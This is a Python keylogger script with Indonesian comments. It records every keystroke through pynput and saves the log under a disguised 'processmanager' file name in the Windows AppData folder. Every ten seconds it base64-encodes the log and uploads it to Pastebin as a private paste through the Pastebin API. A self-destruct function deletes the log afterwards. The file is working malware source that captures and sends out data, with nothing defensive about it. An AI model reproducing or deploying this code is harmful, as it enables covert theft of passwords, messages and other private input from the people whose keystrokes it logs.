#!/usr/bin/python

import os
import time
import threading
import requests
import base64  # Digunakan untuk encoding file ke base64
from pynput.keyboard import Listener  # Library untuk keylogger

# Kelas utama untuk menangkap dan menyimpan log dari penekanan tombol
class Key():
    keys = []  # List untuk menyimpan penekanan tombol
    count = 0  # Counter untuk menghitung jumlah tombol yang ditekan
    flag = 0  # Flag untuk menghentikan keylogger
    hostname = os.getenv("COMPUTERNAME")  # Mendapatkan nama komputer
    # Menentukan path penyimpanan log berdasarkan nama komputer
    path = os.path.join(os.environ['appdata'], f'{hostname}_processmanager.txt')

    # Fungsi untuk menangkap penekanan tombol
    def on_press(self, key):
        self.keys.append(key)  # Menambahkan penekanan tombol ke dalam list
        self.count += 1

        if self.count >= 1:  # Jika sudah ada tombol yang ditekan
            self.count = 0
            self.write_file(self.keys)  # Simpan log ke file
            self.keys = []  # Kosongkan list setelah disimpan

    # Fungsi untuk membaca isi log dari file
    def read_logs(self):
        if os.path.exists(self.path):  # Mengecek apakah file log ada
            with open(self.path, 'rt') as f:
                return f.read()  # Mengembalikan isi log
        return None  # Mengembalikan None jika file tidak ada

    # Fungsi untuk menulis log penekanan tombol ke file
    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")  # Membersihkan format string dari key
                if k.find("backspace") > 0:
                    f.write("|BackSpace|")
                elif k.find('enter') > 0:
                    f.write("\n")
                elif k.find("shift") > 0:
                    f.write("|Shift|")
                elif k.find("space") > 0:
                    f.write(" ")
                elif k.find("caps_lock") > 0:
                    f.write(" |caps_lock| ")
                else:
                    f.write(k)  # Menyimpan karakter yang ditekan

    # Fungsi untuk menghentikan keylogger dan menghapus file log
    def self_destruct(self):
        self.flag = 1  # Menandakan keylogger berhenti
        self.listener.stop()  # Menghentikan listener dari pynput
        if os.path.exists(self.path):
            os.remove(self.path)  # Menghapus file log jika ada
        else:
            print("File tidak ditemukan.")

    # Fungsi untuk memulai keylogger
    def start(self):
        self.listener = Listener(on_press=self.on_press)  # Inisialisasi listener
        self.listener.start()  # Mulai listener



# Fungsi untuk mengirim log ke Pastebin
def plain_paste(title, contents):
    username = "username"  # Username akun Pastebin
    password = "password"  # Password akun Pastebin
    api_dev_key = "pastebin_api_dev_key"  # API dev key dari Pastebin

    login_url = "https://pastebin.com/api/api_login.php"
    login_data = {
        "api_dev_key": api_dev_key,
        "api_user_name": username,
        "api_user_password": password
    }

    # Login ke Pastebin untuk mendapatkan user key
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text

    # Encode isi log dengan base64 sebelum dikirim ke Pastebin
    encoded_contents = base64.b64encode(contents.encode('utf-8')).decode('utf-8')

    # Kirim log ke Pastebin sebagai paste baru
    paste_url = "https://pastebin.com/api/api_post.php"
    paste_data = {
        "api_paste_name": title,
        "api_paste_code": encoded_contents,  # Mengirim log yang sudah diencode
        "api_dev_key": api_dev_key,
        "api_user_key": api_user_key,
        "api_option": 'paste',
        "api_paste_private": 2,  # 0 = public, 1 = unlisted, 2 = private
    }

    r = requests.post(paste_url, data=paste_data)
    if r.status_code == 200:
        print(f"Log berhasil diupload ke Pastebin: {r.text}")
    else:
        print(f"Gagal mengupload log ke Pastebin: {r.status_code}")

def stop_keylogger(logkey):
    # Menunggu input dari pengguna untuk menghentikan keylogger
    input("Tekan Enter untuk menghentikan keylogger...\n")
    logkey.flag = 1  # Mengatur flag menjadi 1 untuk menghentikan keylogger

# Fungsi utama
if __name__ == "__main__":
    logkey = Key()
    t1 = threading.Thread(target=logkey.start)
    t2 = threading.Thread(target=stop_keylogger, args=(logkey,))

    t1.start()  # Jalankan keylogger
    t2.start()  # Jalankan thread untuk mendeteksi kapan keylogger harus berhenti

    # Loop untuk mengirim log setiap 10 detik
    while logkey.flag != 1:
        time.sleep(10)
        logs = logkey.read_logs()

        if logs:
            plain_paste(f"Keylogger Logs dari {logkey.hostname}", logs)
            print("Log dikirim ke Pastebin")
        else:
            print("Tidak ada log untuk dikirim.")

    logkey.self_destruct()  # Menghentikan keylogger
    t1.join()  # Tunggu thread keylogger selesai
    t2.join()  # Tunggu thread penghentian selesai
